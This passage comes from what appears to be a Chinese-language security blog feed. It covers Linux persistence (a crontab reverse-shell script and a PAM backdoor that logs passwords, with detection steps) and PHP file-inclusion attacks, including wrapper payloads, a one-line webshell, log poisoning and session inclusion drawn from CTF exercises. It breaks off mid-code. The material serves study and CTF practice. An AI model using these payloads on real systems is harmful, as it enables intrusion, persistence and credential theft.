href=\"#0x04crontab反弹shell\">#</a> 0x04crontab 反弹 shell</h4>\n<p>crontab 命令用于设置周期性被执行的指令。新建 shell 脚本，利用脚本进行反弹。</p>\n<p>a、创建 shell 脚本，例如在 /etc/evil.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p><code>chmod +sx /etc/evil.sh</code></p>\n<p>b、crontab -e 设置定时任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#每一分钟执行一次</span><br><span class=\"line\">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure>\n<p>重启 crond 服务， <code>service crond restart</code> ，然后就可以用 nc 接收 shell。</p>\n<h4 id=\"0x05pam后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05pam后门\">#</a> 0x05pam 后门</h4>\n<p>PAM （Pluggable Authentication Modules ）是由 Sun 提出的一种认证机制。它通过提供一些动态链接库和一套统一的 API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM 最初是集成在 Solaris 中，目前已移植到其它系统中，如 Linux、SunOS、HP-UX 9.0 等。</p>\n<p>利用方法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class=\"line\">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class=\"line\">3、编译安装PAM</span><br><span class=\"line\">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1、通过Strace跟踪ssh</span><br><span class=\"line\">ps axu | grep sshd</span><br><span class=\"line\">strace -o aa -ff -p PID</span><br><span class=\"line\">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class=\"line\"># 2、检查pam_unix.so的修改时间</span><br><span class=\"line\">stat /lib/security/pam_unix.so      #32位</span><br><span class=\"line\">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/17/include/",
            "url": "http://example.com/2022/05/17/include/",
            "title": "file include",
            "date_published": "2022-05-17T05:38:45.000Z",
            "content_html": "<h1 id=\"file-include\"><a class=\"markdownIt-Anchor\" href=\"#file-include\">#</a> file include</h1>\n<blockquote>\n<p>来自 pikachu 的介绍：</p>\n<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：<br>\ninclude(),include_once()<br>\nrequire(),require_once()<br>\n 这些文件包含函数，这些函数在代码设计中被经常使用到。</p>\n<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个 “意想不到” 的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>\n**1. 本地文件包含漏洞：** 仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>\n**2. 远程文件包含漏洞：** 能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>\n<p>因此，在 web 应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>\n</blockquote>\n<h2 id=\"php伪协议\"><a class=\"markdownIt-Anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n<p>文件包含函数 (php):</p>\n<blockquote>\n<p>include</p>\n<p>include_once</p>\n<p>require</p>\n<p>require_one</p>\n<p>nclude 与 require 基本是相同的，除了错误处理方面:</p>\n<ul>\n<li>\n<p>include ()，只生成警告（E_WARNING），并且脚本会继续</p>\n</li>\n<li>\n<p>require ()，会生成致命错误（E_COMPILE_ERROR）并停止脚本</p>\n</li>\n<li>\n<p>include_once () 与 require ()_once ()，如果文件已包含，则不会包含，其他特性如上</p>\n</li>\n</ul>\n</blockquote>\n<p>直接包含 php，html 文件会直接执行，对于 txt 文件或者 linux 下普通文件，可以直接读取</p>\n<p>对于 php 伪协议，使用时需要注意 allow_url_open 和 allow_url_include ，有些伪协议会对此有限制，有些没有</p>\n<h4 id=\"1file协议\"><a class=\"markdownIt-Anchor\" href=\"#1file协议\">#</a> 1.file 协议</h4>\n<p>allow_url_fopen ：off/on</p>\n<p>allow_url_include：off/on</p>\n<p><code>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</code></p>\n<h4 id=\"2phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#2phpfilter\">#</a> 2.php://filter</h4>\n<p>读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on/off</p>\n<blockquote>\n<p>?file=php://filter/read=convert.base64-encode/resource=web1.php</p>\n<p>?file=php://filter/write=convert.base64-decode/resource=web1.php</p>\n</blockquote>\n<h4 id=\"3phpinput\"><a class=\"markdownIt-Anchor\" href=\"#3phpinput\">#</a> 3.php://input</h4>\n<p>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。http 方法为 get 时并不影响 input 接收 post 参数</p>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on</p>\n<p>当然也可以在 post 中写入一句话木马 <code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;');?&gt;</code></p>\n<p>可以配合 file_get_contents 读文件或者 system 执行系统命令，或者写马</p>\n<h4 id=\"4zipbzip2-zlib\"><a class=\"markdownIt-Anchor\" href=\"#4zipbzip2-zlib\">#</a> 4.zip://,bzip2://, zlib://</h4>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on/off</p>\n<h5 id=\"41-zip\"><a class=\"markdownIt-Anchor\" href=\"#41-zip\">#</a> 4.1 zip://</h5>\n<p><code>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>\n<p><code>?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</code></p>\n<p>如果网站限制，可以将后缀改为 jgp，仍可以解析</p>\n<p>需要将 #进行 url 编码</p>\n<h5 id=\"42-bzip2\"><a class=\"markdownIt-Anchor\" href=\"#42-bzip2\">#</a> 4.2 bzip2://</h5>\n<p><code>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code></p>\n<h5 id=\"43-zlib\"><a class=\"markdownIt-Anchor\" href=\"#43-zlib\">#</a> 4.3 zlib://</h5>\n<p><code>?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></p>\n<h4 id=\"5data\"><a class=\"markdownIt-Anchor\" href=\"#5data\">#</a> 5.data://</h4>\n<p>allow_url_open=on</p>\n<p>allow_url_include=on</p>\n<p><code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code></p>\n<p><code>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2476579/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png?x-oss-process=image%2Fresize%2Cw_889%2Climit_0%2Fresize%2Cw_889%2Climit_0\" alt=\"img\"></p>\n<h3 id=\"一些小题目\"><a class=\"markdownIt-Anchor\" href=\"#一些小题目\">#</a> 一些小题目</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://filter&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&#x27;hacker!&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tif ($file!=&quot;http://www.baidu.com&quot;) echo &quot;tips：flag在当前目录的某个文件中&quot;;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &#x27;&lt;a href=&quot;?file=http://www.baidu.com&quot;&gt;click go baidu&lt;/a&gt;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//file=php://input  &lt;post&gt; &lt;?php system(&#x27;dir&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">$a= $_GET[&quot;a&quot;];</span><br><span class=\"line\">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class=\"line\">\techo &quot;success\\n&quot;;</span><br><span class=\"line\">\techo $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//a=php://input    &lt;post&gt; I want flag</span><br><span class=\"line\">//file_get_contents可以读取input流</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if (!$file) echo &#x27;&lt;a href=&quot;?file=upload&quot;&gt;upload?&lt;/a&gt;&#x27;;</span><br><span class=\"line\">if(stristr($file,&quot;input&quot;)||stristr($file, &quot;filter&quot;)||stristr($file,&quot;data&quot;)/*||stristr($file,&quot;phar&quot;)*/)&#123;</span><br><span class=\"line\">\techo &quot;hack?&quot;;</span><br><span class=\"line\">\texit();</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgi-fast-cgiphp-fpm\"><a class=\"markdownIt-Anchor\" href=\"#cgi-fast-cgiphp-fpm\">#</a> CGI、FAST CGI，PHP FPM</h2>\n<p>CGI: 指的是 Web 服务器与 web 应用程序之间的一种数据交换协议。</p>\n<p>FastCGI: 类似于 CGI，Fast-CGI 也是一种通信协议，但是它在 CGI 的基础上，在效率上做了一些优化。只有非静态文件才会被 fastcgi 处理</p>\n<p>PHP-CGI: PHP-CGI 是 PHP 对 Web 服务器提供的 CGI 协议的接口程序，即实现了 CGI 协议的 php 解释器程序。它能解析 PHP，也能通过 CGI 与 web 服务器通信。</p>\n<p>PHP-FPM: 是 PHP 对 Web 服务器提供的 FastCGI 协议的接口程序，即在实现解释 PHP 脚本和与 web 服务器通讯的基础上，额外还提供了相对进程调度、任务管理功能。fastcgi process manager</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105160625653.png\" alt=\"image-20221105160625653\"></p>\n<p>Apache/nginx 加载 php：</p>\n<p>1. 通过 so 模块加载</p>\n<p>2. 通过 fpm</p>\n<p>3. 通过 cgi</p>\n<p>最佳方式是 apache/Nginx + fastcgi + php fpm</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105161200210.png\" alt=\"image-20221105161200210\" style=\"zoom:67%;\" />\n<p>因此 PHP-fpm 是一个 fastcgi 进程管理器，是对于 fastcgi 协议的具体体现</p>\n<p>web 中间件和 phpfpm 的通信方式有两种</p>\n<p>1.socket</p>\n<p>2.TCP 模式</p>\n<p>fastcgi 协议由多个 recode 组成，recode 由 header 和 body 组成，中间件将这两种封装好发送给后端</p>\n<p>可见，一个 FastCGI record 结构最大支持的 body 大小是 2^16，也就是 65536 字节</p>\n<p>recode 中有 type 字段，type 有七种，第 4 种 type 是给 fmp 传递环境参数时表名数据为 key-value 对</p>\n<p>type=4 时，nginx 会将请求分为 key-value 形式，fpm 收到中间件发来的 key-value，最终执行 key 为 script_name，该 value 为你请求的路径</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164011830.png\" alt=\"image-20221105164011830\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164219506.png\" alt=\"image-20221105164219506\"></p>\n<p>服务器中间件和后端语言（PHP-FPM）通信，第一个数据包就是 type 为 1 的 record，后续互相交流，发送 type 为 4、5、6、7 的 record，结束时发送 type 为 2、3 的 record</p>\n<p>当后端语言（PHP-FPM）拿到由 Nginx 发过来的 FastCGl 数据包后，进行解析，得到上述这些环境变量。然后执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 /var/www/html/index.php</p>\n<p>php-Cgi:</p>\n<p>1) Cgi 协议的实现，用来解释 php 请求；过程: php 请求 -&gt;php-Cgi 读取并解析 php.ini 文件，初始化环境 -&gt; 根据请求参数，返回处理结果</p>\n<p>2）单个进程只能处理一个请求，每一个进程，都需读取 php.ini 进行解析，效率较低</p>\n<p>3）修改完 php.ini 文件，启动 php-Cgi 程序不会生效，无法平滑重启</p>\n<h2 id=\"日志包含\"><a class=\"markdownIt-Anchor\" href=\"#日志包含\">#</a> 日志包含</h2>\n<p>一般日志位置 /var/log/httpd/access.log</p>\n<p><strong>将木马写到日志中，知道日志文件名与路径，存在文件包含漏洞</strong></p>\n<p>首先在 url 中写入自己想要执行的内容，比如 <code>127.0.0.1/inlcude?&lt;?php phpinfo(); ?&gt;</code></p>\n<p>但 url 中会被编码，导致无法包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:33:08 +0800] &quot;GET /html/html/flag.php HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:33:19 +0800] &quot;GET /html/html/flag.php?%3C?php%20phpinfo();%20?%3E HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以通过抓包，修改为未编码的形式</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030163914509.png\" alt=\"image-20221030163914509\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在包含日志文件即可</p>\n<p>防止文件包含：文件名包含随机数，定期分割文件，更改日志路径</p>\n<p>如果是 bt 面板搭建的，记得关掉 open_basedir</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165251590.png\" alt=\"image-20221030165251590\" style=\"zoom:80%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165348749.png\" alt=\"image-20221030165348749\" style=\"zoom:67%;\" />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzYwNTM2NDg=\">open_basedir restriction in effect. 原因与解决方法 - 知乎 (zhihu.com)</span></p>\n<h2 id=\"session包含\"><a class=\"markdownIt-Anchor\" href=\"#session包含\">#</a> session 包含</h2>\n<p>前置知识～:cookie 与 session，这个我在 xss 的开头讲过了</p>\n<p>session 目录:/var/llib/php/session</p>\n<p>文件格式:sess_sessid</p>\n<p><strong>知道 session 的路径，可以控制 session 文件中的内容，存在文件包含</strong></p>\n<p><strong>session 常见存储路径：</strong></p>\n<ul>\n<li>/var/lib/php/sess_PHPSESSID</li>\n<li>/var/lib/php/sess_PHPSESSID</li>\n<li>/tmp/sess_PHPSESSID</li>\n<li>/tmp/sessions/sess_PHPSESSID</li>\n<li>session 文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</li>\n</ul>\n<h4 id=\"一道ctf关于session包含的题目\"><a class=\"markdownIt-Anchor\" href=\"#一道ctf关于session包含的题目\">#</a> 一道 CTF 关于 session 包含的题目</h4>\n<p>页面打开之后有 login 和 register 选项，并且点击后 url 长这样:</p>\n<p><code>http://1.1.1.1/index.php?action=login.php</code>   <code>http://1.1.1.1/index.php?action=register.php</code></p>\n<p>很明显，这是通过 include 不同的文件加载不同的页面</p>\n<p>那么就有可能存在文件包含漏洞了</p>\n<p>尝试用 php://filter 读源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//login.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"string\">&#x27;config.php&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &#123;</span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Location: index.php&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]) &#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$mysqli</span> = @<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbuser</span>, <span class=\"variable\">$dbpass</span>, <span class=\"variable\">$dbname</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;could not connect to the database:\\n&quot;</span> . <span class=\"variable\">$mysqli</span>-&gt;connect_error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select password from user where username=?&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;s&quot;</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_result</span>(<span class=\"variable\">$res_password</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">fetch</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$res_password</span> == <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$username</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;location:index.php&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Invalid user name or password&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">        <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//register.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">&#x27;config.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span> = @<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbuser</span>, <span class=\"variable\">$dbpass</span>, <span class=\"variable\">$dbname</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;could not connect to the database:\\n&quot;</span> . <span class=\"variable\">$mysqli</span>-&gt;connect_error);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">set_charset</span>(<span class=\"string\">&quot;utf8&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from user where username=?&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;s&quot;</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_result</span>(<span class=\"variable\">$res_id</span>, <span class=\"variable\">$res_username</span>, <span class=\"variable\">$res_password</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ 